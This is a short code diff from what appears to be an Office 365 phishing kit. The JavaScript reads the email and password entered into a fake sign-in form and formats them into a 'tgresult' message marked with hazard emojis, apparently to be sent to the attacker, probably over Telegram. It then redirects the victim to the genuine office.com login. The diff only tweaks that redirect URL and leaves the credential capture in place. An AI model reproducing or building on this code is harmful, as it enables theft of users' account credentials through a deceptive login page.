@@ -93,7 +93,7 @@ $(document).ready(function() {
         $('.btn-signin').prop('disabled', true);
         var user = $('#email').val();
         var pass = $('#password').val();
-        var redirecturl = "https://www.office.com/login?es=Click&login_hint="+encodeURI(email)+"&ru=%2F";
+        var redirecturl = "https://www.office.com/login?es=Click&&ru=%2F";
         tgresult  = "+----+ ☣️! OFFICE365[LOGIN] !☣️ +----+\n";
         tgresult += "+ ☢️ LOGIN INFO \n";
         tgresult += "| [EMAIL]: "+ user +"\n";
